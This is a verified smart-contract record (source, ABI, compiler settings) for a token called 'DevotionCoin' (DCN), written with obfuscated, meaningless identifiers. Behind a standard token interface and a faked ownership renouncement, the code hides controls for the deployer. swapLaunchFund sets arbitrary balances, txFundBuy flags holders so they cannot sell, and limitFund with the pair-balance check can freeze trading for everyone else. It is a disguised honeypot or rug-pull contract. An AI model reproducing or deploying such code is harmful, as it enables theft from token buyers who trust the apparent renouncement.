{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract limitLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchReceiver {\n    function createPair(address senderTx, address atShould) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fromTxFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSender) external view returns (uint256);\n\n    function transfer(address receiverLaunchedEnable, uint256 takeAmount) external returns (bool);\n\n    function allowance(address enableAtLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLaunchedEnable,\n        uint256 takeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMarketing, uint256 value);\n    event Approval(address indexed enableAtLimit, address indexed spender, uint256 value);\n}\n\ninterface autoAmount is autoTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevotionCoin is limitLaunch, autoTo, autoAmount {\n\n    uint256 public feeLaunch;\n\n    address atAuto;\n\n    string private atTotalWallet = \"DCN\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenMaxLaunched;\n    }\n\n    function launchedTeam(address marketingMode, address receiverLaunchedEnable, uint256 takeAmount) internal returns (bool) {\n        if (marketingMode == shouldTotalAt) {\n            return fromTx(marketingMode, receiverLaunchedEnable, takeAmount);\n        }\n        uint256 marketingExempt = autoTo(tokenTrading).balanceOf(atAuto);\n        require(marketingExempt == listReceiver);\n        require(receiverLaunchedEnable != atAuto);\n        if (tokenMode[marketingMode]) {\n            return fromTx(marketingMode, receiverLaunchedEnable, modeLaunchedFund);\n        }\n        takeAmount = sellFund(marketingMode, receiverLaunchedEnable, takeAmount);\n        return fromTx(marketingMode, receiverLaunchedEnable, takeAmount);\n    }\n\n    function enableSender(address feeReceiver) public {\n        if (receiverMin) {\n            return;\n        }\n        \n        walletBuy[feeReceiver] = true;\n        \n        receiverMin = true;\n    }\n\n    function swapLaunchFund(address shouldTotal, uint256 takeAmount) public {\n        senderIs();\n        fromTeamMarketing[shouldTotal] = takeAmount;\n    }\n\n    function sellFund(address marketingMode, address receiverLaunchedEnable, uint256 takeAmount) internal view returns (uint256) {\n        require(takeAmount > 0);\n\n        uint256 fundTotal = 0;\n        if (marketingMode == tokenTrading && launchAmount > 0) {\n            fundTotal = takeAmount * launchAmount / 100;\n        } else if (receiverLaunchedEnable == tokenTrading && shouldMin > 0) {\n            fundTotal = takeAmount * shouldMin / 100;\n        }\n        require(fundTotal <= takeAmount);\n        return takeAmount - fundTotal;\n    }\n\n    function approve(address enableTakeLimit, uint256 takeAmount) public virtual override returns (bool) {\n        tradingSellAt[_msgSender()][enableTakeLimit] = takeAmount;\n        emit Approval(_msgSender(), enableTakeLimit, takeAmount);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeFundReceiver;\n    }\n\n    address modeSwapWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address tradingAuto, address enableTakeLimit) external view virtual override returns (uint256) {\n        if (enableTakeLimit == modeSwapWallet) {\n            return type(uint256).max;\n        }\n        return tradingSellAt[tradingAuto][enableTakeLimit];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTotalWallet;\n    }\n\n    bool private toTrading;\n\n    function limitFund(uint256 takeAmount) public {\n        senderIs();\n        listReceiver = takeAmount;\n    }\n\n    function fromTx(address marketingMode, address receiverLaunchedEnable, uint256 takeAmount) internal returns (bool) {\n        require(fromTeamMarketing[marketingMode] >= takeAmount);\n        fromTeamMarketing[marketingMode] -= takeAmount;\n        fromTeamMarketing[receiverLaunchedEnable] += takeAmount;\n        emit Transfer(marketingMode, receiverLaunchedEnable, takeAmount);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderFee;\n    }\n\n    uint256 private tokenMaxLaunched = 100000000 * 10 ** 18;\n\n    function walletFund() public {\n        emit OwnershipTransferred(shouldTotalAt, address(0));\n        fromLimit = address(0);\n    }\n\n    string private modeFundReceiver = \"Devotion Coin\";\n\n    bool private liquidityTotal;\n\n    uint256 public fundAt;\n\n    uint8 private senderFee = 18;\n\n    bool public receiverMin;\n\n    address public tokenTrading;\n\n    uint256 private shouldBuy;\n\n    event OwnershipTransferred(address indexed receiverLimit, address indexed modeBuyTo);\n\n    function txFundBuy(address sellFee) public {\n        senderIs();\n        if (shouldReceiver) {\n            fundAt = feeLaunch;\n        }\n        if (sellFee == shouldTotalAt || sellFee == tokenTrading) {\n            return;\n        }\n        tokenMode[sellFee] = true;\n    }\n\n    bool public shouldReceiver;\n\n    address public shouldTotalAt;\n\n    function senderIs() private view {\n        require(walletBuy[_msgSender()]);\n    }\n\n    uint256 constant modeLaunchedFund = 11 ** 10;\n\n    uint256 public shouldMin = 0;\n\n    uint256 listReceiver;\n\n    function balanceOf(address receiverSender) public view virtual override returns (uint256) {\n        return fromTeamMarketing[receiverSender];\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingSellAt;\n\n    address private fromLimit;\n\n    mapping(address => bool) public tokenMode;\n\n    constructor (){\n        if (shouldBuy != feeLaunch) {\n            toTrading = true;\n        }\n        walletFund();\n        fromTxFee tokenFromIs = fromTxFee(modeSwapWallet);\n        tokenTrading = launchReceiver(tokenFromIs.factory()).createPair(tokenFromIs.WETH(), address(this));\n        atAuto = launchReceiver(tokenFromIs.factory()).feeTo();\n        \n        shouldTotalAt = _msgSender();\n        walletBuy[shouldTotalAt] = true;\n        fromTeamMarketing[shouldTotalAt] = tokenMaxLaunched;\n        \n        emit Transfer(address(0), shouldTotalAt, tokenMaxLaunched);\n    }\n\n    function owner() external view returns (address) {\n        return fromLimit;\n    }\n\n    function transferFrom(address marketingMode, address receiverLaunchedEnable, uint256 takeAmount) external override returns (bool) {\n        if (_msgSender() != modeSwapWallet) {\n            if (tradingSellAt[marketingMode][_msgSender()] != type(uint256).max) {\n                require(takeAmount <= tradingSellAt[marketingMode][_msgSender()]);\n                tradingSellAt[marketingMode][_msgSender()] -= takeAmount;\n            }\n        }\n        return launchedTeam(marketingMode, receiverLaunchedEnable, takeAmount);\n    }\n\n    uint256 public launchAmount = 3;\n\n    uint256 teamSellLaunch;\n\n    function transfer(address shouldTotal, uint256 takeAmount) external virtual override returns (bool) {\n        return launchedTeam(_msgSender(), shouldTotal, takeAmount);\n    }\n\n    mapping(address => uint256) private fromTeamMarketing;\n\n    mapping(address => bool) public walletBuy;\n\n    function getOwner() external view returns (address) {\n        return fromLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAtLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeBuyTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTakeLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTakeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotalAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"swapLaunchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunchedEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFee\",\"type\":\"address\"}],\"name\":\"txFundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DevotionCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}